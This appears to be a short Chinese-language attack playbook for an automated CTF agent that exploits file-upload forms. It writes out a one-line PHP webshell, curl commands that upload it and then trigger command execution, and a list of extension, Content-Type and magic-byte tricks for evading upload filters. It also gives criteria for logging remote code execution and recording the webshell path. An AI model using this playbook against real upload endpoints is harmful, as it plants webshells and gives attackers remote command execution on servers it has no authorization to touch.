# upload 上传绕过

适用：上传表单/接口（multipart），图判 entry.family=upload。

打法：
- 直接传 php/jsp 一发：curl -F "file=@shell.php" http://HOST:PORT/upload.php；shell 内容 <?php system($_GET[0]); 先在工作区用 write_file 落盘。
- 被拒再换后缀：.php5/.phtml/.phar/.php.jpg/.php%00.jpg、大小写 .PhP、双后缀 shell.php.jpg。
- 换 Content-Type：image/jpeg；加文件头 GIF89a。
- 传成功找回显路径（/uploads/xxx、响应 JSON 里的 url），再 curl 触发：
  curl "http://HOST:PORT/uploads/shell.php?0=cat+/flag*"

判定：回显执行结果/读到 flag → fact(kind=rce)。webshell 路径写进 fact。

停止：三种后缀全部 415/413/校验报错且无路径回显，标 dead。
